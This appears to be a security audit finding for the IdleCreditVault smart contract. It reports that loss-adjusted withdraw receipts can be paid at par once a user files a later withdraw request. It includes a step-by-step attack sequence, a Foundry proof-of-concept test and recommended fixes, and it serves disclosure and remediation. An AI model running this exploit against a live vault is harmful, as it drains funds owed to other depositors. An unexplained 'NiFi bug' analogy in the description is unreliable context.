### Title
Loss-adjusted withdraw receipts are paid at par when a later epoch's request becomes the user's `lastWithdrawRequest` - ([File: contracts/strategies/idle/IdleCreditVault.sol])

### Summary
`IdleCreditVault._claimLossAdjustedWithdrawRequest` only inspects the single epoch stored in `lastWithdrawRequest[_user]` to decide whether the user has a haircut receipt. If a user holds a loss-adjusted receipt from an earlier epoch and then makes a new withdraw request in a later (fully funded) epoch, the loss-adjusted claim is skipped entirely and `_claimFundedWithdrawRequest` pays the aggregate `withdrawsRequests[_user]` — including the haircutted epoch-5 basis — at full par. The haircut recorded in `lossRecoveryPriceByEpoch` is silently bypassed, letting the attacker withdraw more underlyings than were funded and draining funds owed to other claimants.

### Finding Description
The NiFi bug is about trusting unfiltered stored state; the analog here is trusting `lastWithdrawRequest[_user]` as the sole index into per-epoch loss state.

1. `requestWithdraw` records receipts per-epoch (`withdrawsRequestsByEpoch[_user][currentEpoch]`) and aggregates into `withdrawsRequests[_user]`, and stores `lastWithdrawRequest[_user] = currentEpoch` [1](#0-0) . The code comment explicitly notes a user may request again before claiming and "will have to wait for another epoch to claim both requests" — so multiple unclaimed epochs are supported.

2. On a shortfall stop, `collectWithdrawFunds` stores `lossRecoveryPriceByEpoch[epochNumber]` and clears `pendingWithdraws`, but the funded amount is less than the claim basis [2](#0-1) .

3. On claim, `_claimLossAdjustedWithdrawRequest` reads only `lossEpoch = lastWithdrawRequest[_user]`; if that epoch has no stored loss price it returns 0 without checking any other epoch's receipt [3](#0-2) .

4. `_claimFundedWithdrawRequest` then pays `withdrawsRequests[_user]` at par — the aggregate still contains the older loss-adjusted epoch's full basis because `_clearWithdrawClaimForEpoch` was never called for it [4](#0-3) .

Sequence (fixed-APR mode, running epochs):
- Epoch N: attacker requests withdraw of `X`. `stopEpochWithDuration` realizes a loss; borrower funds `X * r` where `r = lossRecoveryPriceByEpoch[N] < RECOVERY_FULL`. Attacker does not claim.
- Epoch M > N (healthy, fully funded): attacker requests withdraw of `Y`. Now `lastWithdrawRequest = M`.
- Epoch M ends fully funded; `epochNumber > M`.
- Attacker calls `claimWithdrawRequest`. Loss-adjusted path checks `lossRecoveryPriceByEpoch[M] == 0` → skipped. Funded path pays `X + Y` at par instead of `X*r + Y`.
- Stolen amount: `X * (1 - r)`. The vault only holds `X*r + Y` for these receipts, so the excess comes from other users' funded claims or the recovery reserve.

### Impact Explanation
Direct theft of underlyings equal to the haircut the attacker was supposed to bear: `X * (RECOVERY_FULL - r) / RECOVERY_FULL`. With a 50% loss epoch and a large `X`, the attacker doubles the effective payout of that receipt, draining the strategy's funded balance and causing insolvency for subsequent claimants (the last claimants' `safeTransfer` fails). This breaks the loss-waterfall invariant: a receipt marked down in `collectWithdrawFunds` is paid whole.

### Likelihood Explanation
Requirements are all unprivileged: the attacker only needs to hold tranche tokens / pass KYC and place withdraw requests in two epochs, the first of which ends with a realized loss via `stopEpochWithDuration`. Loss epochs are a normal (if infrequent) operating mode — `previewLossAdjustedWithdrawFunds` and `collectWithdrawFunds` exist precisely for partial funding — and no privileged cooperation is needed beyond honest manager calls. The attack requires the loss epoch to not be the user's last request epoch, which the attacker fully controls by simply requesting again later.

### Recommendation
Do not gate loss-adjusted claims on `lastWithdrawRequest` alone. Either:
- iterate/lookup `lossRecoveryPriceByEpoch` for every epoch in which the user has a nonzero `withdrawsRequestsByEpoch` entry (e.g., check all epochs with pending basis, or store a per-user list/bitmap of loss epochs), or
- subtract the loss-adjusted epoch basis from `withdrawsRequests[_user]` inside `collectWithdrawFunds`/settlement so the aggregate can never pay a haircutted receipt at par.

A minimal fix: in `_claimLossAdjustedWithdrawRequest`, determine the loss epoch from the user's per-epoch receipts rather than `lastWithdrawRequest`, and ensure `_claimFundedWithdrawRequest` only pays epochs that were fully funded.

// Foundry fork test against IdleCreditVault + IdleCDOEpochVariant.
// Assumes helpers: _depositWithUser(user, amt), _startEpoch(), _stopWithLoss(loss),
// borrower/manager pranks as in test/foundry/IdleCreditVault.t.sol.

function testLossReceiptPaidAtParAfterLaterRequest() external {
    IdleCreditVault vault = IdleCreditVault(address(strategy));
    address attacker = makeAddr("attacker");
    uint256 X = 10_000 * ONE_SCALE;
    uint256 Y = 5_000 * ONE_SCALE;

    // Attacker deposits and requests withdraw in epoch N
    _depositWithUser(attacker, X + Y, true);
    vm.prank(attacker);
    uint256 basisX = cdoEpoch.requestWithdraw(X_trancheAmount, address(AAtranche));

    _startEpoch();
    // Borrower underpays: stopEpochWithDuration realizes a loss so that
    // collectWithdrawFunds stores lossRecoveryPriceByEpoch[N] = r < RECOVERY_FULL
    uint256 fundedX = basisX / 2; // r = 0.5
    deal(defaultUnderlying, borrower, fundedX + activePortion);
    vm.prank(borrower); underlying.approve(address(cdoEpoch), type(uint256).max);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(apr, duration, lossAmount); // triggers collectWithdrawFunds(fundedX)
    assertLt(vault.lossRecoveryPriceByEpoch(epochN), RECOVERY_FULL);

    // Epoch M > N: attacker files a SECOND request; lastWithdrawRequest moves to M
    _startEpoch();
    vm.prank(attacker);
    uint256 basisY = cdoEpoch.requestWithdraw(Y_trancheAmount, address(AAtranche));

    // Epoch M ends fully funded
    _startEpoch();
    deal(defaultUnderlying, borrower, fundsForEpochM);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(apr, expectedInterest);

    // Claim: loss-adjusted path looks at epoch M (price 0) and skips epoch N.
    uint256 balBefore = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();
    uint256 got = underlying.balanceOf(attacker) - balBefore;

    // BUG: paid X + Y at par instead of X*0.5 + Y
    assertEq(got, basisX + basisY);            // actual (overpaid)
    // expected: assertApproxEqAbs(got, basisX/2 + basisY, 1);
}

  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
  }
